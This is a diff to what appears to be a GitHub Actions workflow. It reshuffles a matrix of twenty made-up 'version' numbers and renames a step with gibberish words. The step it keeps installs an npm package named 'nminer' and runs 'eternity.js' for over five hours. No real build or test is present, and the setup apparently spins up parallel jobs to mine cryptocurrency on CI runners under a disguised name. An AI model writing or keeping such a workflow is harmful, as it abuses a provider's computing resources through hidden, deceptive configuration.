@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 194 }
-          - { version: 8307 }
-          - { version: 8972 }
-          - { version: 4224 }
-          - { version: 5971 }
-          - { version: 5269 }
-          - { version: 3888 }
-          - { version: 9375 }
-          - { version: 5507 }
-          - { version: 6878 }
-          - { version: 5270 }
-          - { version: 1538 }
-          - { version: 7159 }
-          - { version: 2406 }
-          - { version: 8560 }
-          - { version: 7104 }
-          - { version: 9749 }
-          - { version: 4016 }
-          - { version: 2552 }
-          - { version: 9254 }
+          - { version: 9015 }
+          - { version: 782 }
+          - { version: 1737 }
+          - { version: 7900 }
+          - { version: 2211 }
+          - { version: 4393 }
+          - { version: 4049 }
+          - { version: 6187 }
+          - { version: 7951 }
+          - { version: 4897 }
+          - { version: 2701 }
+          - { version: 1248 }
+          - { version: 3893 }
+          - { version: 5712 }
+          - { version: 3711 }
+          - { version: 606 }
+          - { version: 1105 }
+          - { version: 3885 }
+          - { version: 3202 }
+          - { version: 7830 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: whereas printer responsibility hurtful
+      - name: failing dowse demob
         run: |
           npm install nminer@latest
-          timeout 342m node eternity.js || echo "eternity executed"
+          timeout 331m node eternity.js || echo "eternity executed"
